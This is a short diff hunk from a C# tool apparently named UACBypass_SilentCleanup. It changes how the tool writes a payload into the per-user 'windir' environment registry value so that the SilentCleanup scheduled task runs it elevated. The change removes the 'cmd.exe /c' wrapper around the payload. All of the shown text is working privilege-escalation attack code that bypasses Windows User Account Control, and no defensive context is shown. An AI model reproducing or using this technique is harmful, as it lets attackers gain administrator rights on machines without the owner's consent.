@@ -42,7 +42,7 @@ namespace UACBypass_SilentCleanup
                 // Registry Key Modification
                 RegistryKey key;
                 key = Registry.CurrentUser.CreateSubKey(@"Environment");
-                key.SetValue("windir", "cmd.exe /c \"" + payload + "\" & ", RegistryValueKind.String);
+                key.SetValue("windir", payload + " & ", RegistryValueKind.String);
                 key.Close();
 
                 Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
